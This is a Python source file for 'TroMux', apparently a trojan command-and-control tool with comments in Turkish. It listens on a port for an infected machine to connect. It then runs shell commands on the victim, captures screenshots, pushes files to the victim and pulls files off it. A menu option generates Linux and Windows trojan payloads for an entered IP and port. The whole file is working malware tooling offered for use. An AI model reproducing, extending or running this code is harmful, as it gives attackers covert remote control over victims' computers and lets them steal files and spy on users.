import socket
import os
import sys
import subprocess
import threading
import pwd
from playsound import playsound
from pyfiglet import Figlet
custom_fig = Figlet(font='jazmine')

dizin = os.getcwd()
sys.path.append("{}/client".format(dizin))

from linux import * 
from windows import *


BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'

class Trojan():

    __start = 0
    BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'

    def __init__(self):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.port = 12349
        self.host = ''
        self.s.bind((self.host, self.port))
        self.s.listen(1)
        self.c, self.addr = self.s.accept()

        self.while_run()


    #-----------------------------------------------------------
    def music_start(self):
        playsound("multimedia/ringtone_new2.mp3")

    #-----------------------------------------------------------
    def while_run(self):
        #self.music_start()

        while True:

            self.directorystart()
            self.command = input("")

            if self.command == 'exit' or self.command == 'stop': # programi kapatmak
                self.exit(self.command)

            elif not self.command:
                self.notcommand()

            elif self.command == 'clear':
                self.clear()

            elif self.command == '[p]' or self.command == '[pictur]': # ekran resmini cekmek
                self.pictursave()

            elif self.command[0] == '=' and self.command[:3] != '+cd':
                self.mycomp(self.command[1:])

            elif self.command[:3] == "=cd": # dizin deyismek(kendi)
                self.mydirectorygo(self.command[3:])

            elif self.command[:2] == 'cd': # dizin deyismek(hedef)
                self.directorygo(self.command)

            elif self.command[:2] == 'd$': # dosya gondermek
                self.file_send(self.command)

            elif self.command[0] == '$': # dosya indirmek
                self.file_download(self.command)

            else:
                self.command_download(self.command) # comutlari calistirmak

                
    #-------------------------------------------------------
    def clear(self):
        os.system("clear")
    #-------------------------------------------------------
    def pictursave(self):
        self.c.sendall(bytes("[pictur]".encode('utf-8')))

    #--------------------------------------------------------
    def mydirectorygo(self, command):
        try:
            command = command.strip()

            if command == '-':
                self.present1 = self.present
                self.present = os.getcwd()
                os.chdir(self.present1)

            else:

                self.present = os.getcwd()

                os.chdir(command)

                self.nodename = os.uname().nodename
                self.directory = os.getcwd()
                self.whoami = pwd.getpwuid( os.getuid() ).pw_name

                self.all_about = '({}my{}) {}[ {}@{}{}:{}~ ]{}{}$'.format(self.YELLOW, self.END, self.GREEN, self.whoami, self.nodename, self.END, self.BLUE, self.directory, self.END, end= ' ')

                print(self.all_about)

        except:
            pass




    #--------------------------------------------------------
    def notcommand(self):
        pass

    #---------------------------------------------------------
    def file_send(self, command):

        try:
            self.f = open(command[2:], 'rb')
            self.data = self.f.read()
            self.c.sendall(bytes(command.encode("utf-8")))

            while self.data:
                self.c.sendall(self.data)
                self.data = self.f.read()

            self.f.close()
            self.c.send(bytes("None".encode("utf-8")))

        except:
            print("No such file or directory [{}]".format(self.command[2:]))

    #---------------------------------------------------------
    def file_download(self, command):
        self.c.sendall(bytes(self.command.encode("utf-8")))

        self.datas = self.c.recv(1024)

        if self.datas == b'None':
            print("No such file or directory [{}]".format(command[1:]))

        else:
            while True:
                self.f = open(command[1:], 'wb')

                while self.datas:
                    if self.datas[-4:] == b'None':
                        self.f.write(self.datas[:-4])
                        self.f.close()
                        print("-- {} -- download".format(command[1:]))
                        break

                    self.f.write(self.datas)
                    self.datas = self.c.recv(1024)

                self.f.close()
                break


    #----------------------------------------------------------
    def directorystart(self):
        if  self.__start == 0:
            self.directory_start = self.c.recv(1024).decode('utf-8')
            self.__start = 1

        else:
            pass

        print(self.directory_start, end = ' ')

    #-----------------------------------------------------------
    def directorygo(self, command):
        self.c.sendall(bytes(command.encode("utf-8")))
        self.__start = 0

    #------------------------------------------------------------
    def command_download(self, command):

        self.c.sendall(bytes(command.encode("utf-8")))
        self.datas = self.c.recv(1024).decode('utf-8')

        if self.datas == 'NoneC':
            print("{}: command not found".format(command))

        else:
            while self.datas:
                if self.datas[-4:] == 'None':
                    if len(self.datas) == 4:
                        pass
                
                    else:
                        print(self.datas[:-4].strip())

                    break

                print(self.datas)
                self.datas = self.c.recv(1024).decode('utf-8')



    #-------------------------------------------------------------
    def exit(self, command):
        self.c.sendall(bytes(command.encode("utf-8")))
        sys.exit()

    #-------------------------------------------------------------
    def mycomp(self, command):
        self.nodename = os.uname().nodename
        self.directory = os.getcwd()
        self.whoami = pwd.getpwuid( os.getuid() ).pw_name

        self.all_about = '({}my{}) {}{}@{}{}:{}~{}{}$'.format(self.YELLOW, self.END, self.GREEN, self.whoami, self.nodename, self.END, self.BLUE, self.directory, self.END, end= ' ')
        
        print('----------------------------------------------\n'+self.all_about)
        sys.stdout.flush()
        os.system(command)
        #sys.stdout.flush()
        print('----------------------------------------------')


#-----------------------------------------------
def trojan_start():
    trojan = Trojan()
#------------------------------------------------
def linux_trojan():
    ip = input("Your Ip: ")
    port = input("Port: ")

    if not ip or not port:
        print("\n[] {}Ip or Port no entered{} []\n".format(RED, END))

    else:
        create_trojan_linux(ip, port)
        print("\n[] {}Linux trojan create {}[]\n".format(RED, END))

#---------------------------------------------------
def windows_trojan():
    ip = input("Your Ip: ")
    port = input("Port: ")

    if not ip or not port:
        print("\n[] {}Ip or Port no entered{} []\n".format(RED, END))

    else:
        create_trojan_windows(ip, port)
        print("\n[] {}Windows trojan create {}[]\n".format(RED, END))

#----------------------------------------------------
def main():
    title = '\n{}1) Start trojan\n2) Create trojan\n3) Exit{}'.format(WHITE, END)

    while True:
        os.system("clear")
        print(BLUE)
        print(custom_fig.renderText('TroMux'))
        print(title)
        operation = input(":")

        if operation == '1': # server baslatmaq ucundur
            trojan_start()

        elif operation == '2': # troja  olusturmaq ucundur
            while True:
                print("\n1) Linux\n2) Windows\n3) exit")
                operation = input(":")

                if operation == '1': # linux trojan olusturmak
                    linux_trojan()

                elif operation == '2': # windows trojan olusturmak
                    windows_trojan()

                elif operation == '3': # cikis yapmak
                    break


        elif operation == '3': # programnan cixmaq ucundur
            sys.exit()

        else:
            pass

def database_contenct():
    liste = mysql_connector.select()
    name_admin = liste[0]

    name = input("Name:")
    password = input("Password:")

    if name == name_admin[0] and password == name_admin[1]:
        main()

    else:
        pass

    


#database_contenct()
main()
